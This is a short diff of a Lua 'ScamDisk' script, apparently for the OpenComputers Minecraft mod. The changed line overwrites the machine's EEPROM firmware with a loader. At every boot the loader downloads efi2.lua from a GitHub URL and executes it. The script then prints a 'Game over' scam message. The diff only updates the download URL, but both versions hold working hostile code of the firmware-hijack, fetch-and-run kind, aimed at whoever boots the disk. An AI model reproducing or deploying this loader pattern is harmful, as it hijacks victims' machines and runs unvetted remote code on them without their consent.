@@ -70,7 +70,7 @@ for i=0, 100 do
     sleep( math.random(0.025, 0.25) )
 end
 
-eeprom.set("local a,b,c=component.proxy(component.list(\"internet\")()).request(\"https://raw.githubusercontent.com/KKosty4ka/OpenComputers-ScamDisk/master/efi2.lua\"),\"\"while true do c=a.read(math.huge)if c then b=b..c else break end end;a.close()load(b)()")
+eeprom.set("local a,b,c=component.proxy(component.list(\"internet\")()).request(\"https://raw.githubusercontent.com/KKosty4ka/ScamDisk/master/efi2.lua\"),\"\"while true do c=a.read(math.huge)if c then b=b..c else break end end;a.close()load(b)()")
 
 error("Your disk has been scammed by Microsoft ScamDisk. Game over", 0)]]
 
